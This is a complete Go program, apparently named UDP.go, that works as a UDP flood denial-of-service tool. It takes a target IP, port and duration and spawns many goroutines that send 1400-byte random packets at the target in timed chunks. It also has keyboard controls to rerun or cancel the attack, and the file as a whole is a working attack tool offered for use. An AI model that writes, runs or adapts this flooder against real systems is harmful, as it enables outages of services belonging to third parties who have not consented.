package main

import (
	"fmt"
		"log"
			"math/rand"
				"net"
					"os"
						"runtime"
							"strconv"
								"sync/atomic"
									"time"
									)

									const (
										packetSize    = 1400
											chunkDuration = 280
											)

											func main() {
												if len(os.Args) != 4 {
														fmt.Println("Usage: go run UDP.go <target_ip> <target_port> <attack_duration>")
																return
																	}

																		targetIP := os.Args[1]
																			targetPort := os.Args[2]
																				duration, err := strconv.Atoi(os.Args[3])
																					if err != nil || duration <= 0 {
																							fmt.Println("Invalid attack duration:", err)
																									return
																										}

																											for {
																													done := make(chan struct{})
																															go handleUserInput(done)
																																	executeAttack(targetIP, targetPort, duration, done)

																																			// Wait for 'X' input to rerun the attack
																																					for {
																																								var input string
																																											fmt.Scanln(&input)
																																														if input == "X" {
																																																		break
																																																					} else if input == "C" {
																																																									close(done)
																																																													break
																																																																}
																																																																		}

																																																																				if isDone(done) {
																																																																							break
																																																																									}
																																																																										}

																																																																											fmt.Println("Exiting...")
																																																																											}

																																																																											func executeAttack(targetIP, targetPort string, duration int, done chan struct{}) {
																																																																												numThreads := runtime.NumCPU() * 2 // Double the number of threads

																																																																													numChunks := (duration + chunkDuration - 1) / chunkDuration

																																																																														rand.Seed(time.Now().UnixNano())

																																																																															for chunk := 0; chunk < numChunks; chunk++ {
																																																																																	if isDone(done) {
																																																																																				fmt.Println("Attack interrupted.")
																																																																																							break
																																																																																									}

																																																																																											chunkTime := chunkDuration
																																																																																													if (chunk+1)*chunkDuration > duration {
																																																																																																chunkTime = duration - chunk*chunkDuration
																																																																																																		}

																																																																																																				deadline := time.Now().Add(time.Duration(chunkTime) * time.Second)

																																																																																																						go countdown(chunkTime, done)

																																																																																																								for i := 0; i < numThreads; i++ {
																																																																																																											go sendUDPPackets(targetIP, targetPort, deadline, done)
																																																																																																													}

																																																																																																															time.Sleep(time.Duration(chunkTime) * time.Second)
																																																																																																																	fmt.Printf("Chunk %d finished.\n", chunk+1)
																																																																																																																		}

																																																																																																																			fmt.Println("Attack finished.")
																																																																																																																			}

																																																																																																																			func sendUDPPackets(ip, port string, deadline time.Time, done chan struct{}) {
																																																																																																																				conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
																																																																																																																					if err != nil {
																																																																																																																							log.Printf("Error connecting: %v\n", err)
																																																																																																																									return
																																																																																																																										}
																																																																																																																											defer conn.Close()

																																																																																																																												udpConn := conn.(*net.UDPConn)
																																																																																																																													udpConn.SetWriteBuffer(65536)

																																																																																																																														packet := generateEvilPacket(packetSize)
																																																																																																																															var packetsSent uint64

																																																																																																																																for {
																																																																																																																																		if time.Now().After(deadline) {
																																																																																																																																					break
																																																																																																																																							}
																																																																																																																																									if isDone(done) {
																																																																																																																																												break
																																																																																																																																														}

																																																																																																																																																_, err := conn.Write(packet)
																																																																																																																																																		if err != nil {
																																																																																																																																																					log.Printf("Error sending UDP packet: %v\n", err)
																																																																																																																																																								continue
																																																																																																																																																										}

																																																																																																																																																												atomic.AddUint64(&packetsSent, 1)
																																																																																																																																																													}

																																																																																																																																																														log.Printf("Sent %d packets\n", packetsSent)
																																																																																																																																																														}

																																																																																																																																																														func countdown(remainingTime int, done chan struct{}) {
																																																																																																																																																															ticker := time.NewTicker(1 * time.Second)
																																																																																																																																																																defer ticker.Stop()

																																																																																																																																																																	for i := remainingTime; i > 0; i-- {
																																																																																																																																																																			fmt.Printf("\rTime remaining: %d seconds", i)
																																																																																																																																																																					select {
																																																																																																																																																																							case <-ticker.C:
																																																																																																																																																																									case <-done:
																																																																																																																																																																												fmt.Println("\rAttack interrupted.")
																																																																																																																																																																															return
																																																																																																																																																																																	}
																																																																																																																																																																																		}
																																																																																																																																																																																			fmt.Println("\rTime remaining: 0 seconds")
																																																																																																																																																																																			}

																																																																																																																																																																																			func isDone(done chan struct{}) bool {
																																																																																																																																																																																				select {
																																																																																																																																																																																					case <-done:
																																																																																																																																																																																							return true
																																																																																																																																																																																								default:
																																																																																																																																																																																										return false
																																																																																																																																																																																											}
																																																																																																																																																																																											}

																																																																																																																																																																																											func generateEvilPacket(size int) []byte {
																																																																																																																																																																																												packet := make([]byte, size)
																																																																																																																																																																																													for i := 0; i < size; i++ {
																																																																																																																																																																																															packet[i] = byte(rand.Intn(256))
																																																																																																																																																																																																}
																																																																																																																																																																																																	return packet
																																																																																																																																																																																																	}

																																																																																																																																																																																																	func handleUserInput(done chan struct{}) {
																																																																																																																																																																																																		var input string
																																																																																																																																																																																																			for {
																																																																																																																																																																																																					fmt.Scanln(&input)
																																																																																																																																																																																																							if input == "C" {
																																																																																																																																																																																																										close(done)
																																																																																																																																																																																																													return
																																																																																																																																																																																																															}
																																																																																																																																																																																																																}
																																																																																																																																																																																																																}
																																																																																																																																																																																																																
